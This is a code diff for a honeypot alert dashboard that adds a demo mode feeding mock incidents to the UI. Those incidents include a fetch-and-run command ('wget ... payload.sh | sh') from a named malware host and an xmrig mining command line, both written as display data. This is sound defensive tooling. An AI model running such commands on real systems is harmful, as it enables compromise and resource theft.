@@ -60,24 +60,161 @@ const modalMitreTags = document.getElementById("modal-mitre-tags");
 // Local cache of loaded incidents for modal lookup
 let incidentCache = {};
 
+const mockTemplates = [
+  {
+    title: "SSH Brute Force Botnet",
+    severity: "LOW",
+    summary: "Repeated failed login connections detected on honeypot port 22. Multiple root accounts targeted.",
+    src_ip: "185.220.101.5",
+    user: "root",
+    pass: "admin123",
+    command: "None (Auth rejected)",
+    mitre_attack: ["T1110.001 - Brute Force"],
+    vt_lookup: { malicious_score: 0, reputation: -2, asn: "AS1234 Tor Exit Relay", owner: "TorRelayNode", country: "DE" },
+    playbook: "No action required. Host automatically blacklisted scanner IP under fail2ban security policy."
+  },
+  {
+    title: "Malicious Reverse Shell Spawned",
+    severity: "CRITICAL",
+    summary: "Attacker authenticated using default credentials and attempted to download/execute backdoor payload.",
+    src_ip: "91.191.209.124",
+    user: "ubuntu",
+    pass: "ubuntu@123",
+    command: "wget http://mirai-network.biz/payload.sh -O - | sh",
+    mitre_attack: ["T1059.004 - Unix Shell", "T1105 - Ingress Tool Transfer"],
+    vt_lookup: { malicious_score: 48, reputation: -92, asn: "AS4321 Bulletproof Host Corp", owner: "DigitalShade ISP", country: "RU" },
+    playbook: "CRITICAL ALERT: Target VM isolated dynamically. Firewall blocking rule generated for attacker IP."
+  },
+  {
+    title: "SFTP Malware Payload Upload",
+    severity: "HIGH",
+    summary: "Uploaded suspicious ELF executable binary inside /tmp directory via SFTP session.",
+    src_ip: "45.143.203.14",
+    user: "support",
+    pass: "supportPass!",
+    command: "sftp upload: /tmp/cryptominer.x86",
+    mitre_attack: ["T1204.002 - Malicious File", "T1105 - Ingress Tool Transfer"],
+    vt_lookup: { malicious_score: 56, reputation: -115, asn: "AS6677 Botnet Server Node", owner: "LocalNet LLC", country: "CN" },
+    playbook: "HIGH ALERT: Malicious binary purged from disk. Credentials disabled. Attacker IP blacklisted."
+  },
+  {
+    title: "CPU Resource Hijacking (Monero)",
+    severity: "CRITICAL",
+    summary: "Monero miner daemon execution detected inside background tasks. System CPU spiked to 100%.",
+    src_ip: "198.51.100.72",
+    user: "admin",
+    pass: "AdminP@ss1",
+    command: "./xmrig -o pool.minexmr.com -u xmr_wallet --cpu-max-threads-hint=100",
+    mitre_attack: ["T1496 - Resource Hijacking"],
+    vt_lookup: { malicious_score: 15, reputation: -12, asn: "AS8899 VPS Hosting Corp", owner: "CloudHost Inc", country: "US" },
+    playbook: "CRITICAL ALERT: Miner process killed. Temp scripts deleted. IAM instance keys rotated immediately."
+  }
+];
+
 if (isPlaceholder) {
-  // Show Setup Instructions in place of loader if not configured
-  loader.innerHTML = `
-    <div style="text-align: left; max-width: 500px; margin: 0 auto; background: rgba(255, 59, 48, 0.1); border: 1px solid rgba(255, 59, 48, 0.2); padding: 1.5rem; border-radius: 8px;">
-      <h3 style="color: #ff3b30; margin-bottom: 0.5rem;"><i class="fa-solid fa-triangle-exclamation"></i> Firebase Configuration Required</h3>
-      <p style="font-size: 0.9rem; margin-bottom: 1rem;">To listen to the Firestore live feed, you need to create a file named <code>firebase-config.js</code> in the dashboard folder containing your Firebase Web App credentials.</p>
-      <pre style="background: rgba(0,0,0,0.4); padding: 1rem; border-radius: 4px; font-family: monospace; font-size: 0.75rem; color: #5ac8fa; overflow-x: auto;">
-window.firebaseConfig = {
-  apiKey: "AIzaSy...",
-  authDomain: "your-gcp-project.firebaseapp.com",
-  projectId: "your-gcp-project",
-  storageBucket: "your-gcp-project.appspot.com",
-  messagingSenderId: "123456789",
-  appId: "1:1234:web:abcd"
-};
-      </pre>
-    </div>
+  // Hide loader
+  loader.style.display = "none";
+
+  // Create Demo Mode Notice Banner
+  const banner = document.createElement("div");
+  banner.style = "background: rgba(10, 132, 255, 0.1); border: 1px solid rgba(10, 132, 255, 0.2); color: #0a84ff; padding: 0.75rem 1rem; border-radius: 8px; font-size: 0.8rem; margin-bottom: 1.5rem; display: flex; align-items: center; justify-content: space-between; grid-column: span 3;";
+  banner.innerHTML = `
+    <span><i class="fa-solid fa-circle-info"></i> Running in <strong>Demo Mode (Mock Telemetry Feed)</strong>. Connect Firestore in <code>firebase-config.js</code> to link live GCP.</span>
+    <button onclick="this.parentElement.remove()" style="background: none; border: none; color: #0a84ff; cursor: pointer; font-size: 1rem;"><i class="fa-solid fa-times"></i></button>
   `;
+  alertsContainer.parentElement.insertBefore(banner, alertsContainer);
+
+  let totalMockAlerts = 0;
+  let criticalMockAlerts = 0;
+  const ipCounts = {};
+  const mitreCounts = {};
+
+  function triggerMockAlert() {
+    const template = mockTemplates[Math.floor(Math.random() * mockTemplates.length)];
+    const mockId = "mock-" + Math.random().toString(36).substring(2, 9);
+    
+    // Randomize suffix of IP for variety
+    const suffix = Math.floor(Math.random() * 254) + 1;
+    const ipParts = template.src_ip.split(".");
+    ipParts[3] = suffix.toString();
+    const randomizedIp = ipParts.join(".");
+    
+    const incident = {
+      timestamp: new Date().toISOString(),
+      src_ip: randomizedIp,
+      user: template.user,
+      password: template.password,
+      command: template.command,
+      ai_analysis: {
+        severity: template.severity,
+        summary: template.summary,
+        mitre_attack: template.mitre_attack,
+        vt_lookup: {
+          malicious_score: template.vt_lookup.malicious_score,
+          reputation: template.vt_lookup.reputation,
+          asn: template.vt_lookup.asn,
+          owner: template.vt_lookup.owner,
+          country: template.vt_lookup.country
+        },
+        playbook: template.playbook
+      }
+    };
+
+    incidentCache[mockId] = incident;
+    totalMockAlerts++;
+    
+    if (template.severity === "CRITICAL" || template.severity === "HIGH") {
+      criticalMockAlerts++;
+    }
+    
+    ipCounts[randomizedIp] = (ipCounts[randomizedIp] || 0) + 1;
+    template.mitre_attack.forEach(t => {
+      mitreCounts[t] = (mitreCounts[t] || 0) + 1;
+    });
+
+    // Update Stats
+    statTotal.textContent = totalMockAlerts;
+    statCritical.textContent = criticalMockAlerts;
+    
+    // Top IP
+    let topIp = "--";
+    let maxIpCount = 0;
+    for (const [ip, count] of Object.entries(ipCounts)) {
+      if (count > maxIpCount) {
+        maxIpCount = count;
+        topIp = ip;
+      }
+    }
+    statTopIp.textContent = topIp;
+    
+    // Top MITRE
+    let topMitre = "--";
+    let maxMitreCount = 0;
+    for (const [technique, count] of Object.entries(mitreCounts)) {
+      if (count > maxMitreCount) {
+        maxMitreCount = count;
+        topMitre = technique.split(" - ")[0];
+      }
+    }
+    statMitre.textContent = topMitre;
+
+    // Render row (prepend to top)
+    renderAlertRow(mockId, incident, true);
+    
+    // Limit to 25 rows in UI
+    if (alertsContainer.children.length > 25) {
+      alertsContainer.removeChild(alertsContainer.lastChild);
+    }
+  }
+
+  // Pre-seed 6 alerts immediately
+  for (let i = 0; i < 6; i++) {
+    triggerMockAlert();
+  }
+
+  // Add one alert every 7 seconds
+  setInterval(triggerMockAlert, 7000);
+
 } else {
   // Initialize Firebase & Firestore
   try {
@@ -179,7 +316,7 @@ window.firebaseConfig = {
 }
 
 // Function to render an individual alert row in the list
-function renderAlertRow(id, incident) {
+function renderAlertRow(id, incident, prepend = false) {
   const row = document.createElement("div");
   row.className = "alert-row";
   row.dataset.id = id;
@@ -211,7 +348,11 @@ function renderAlertRow(id, incident) {
   `;
   
   row.addEventListener("click", () => openModal(id));
-  alertsContainer.appendChild(row);
+  if (prepend) {
+    alertsContainer.insertBefore(row, alertsContainer.firstChild);
+  } else {
+    alertsContainer.appendChild(row);
+  }
 }
 
 // Modal management
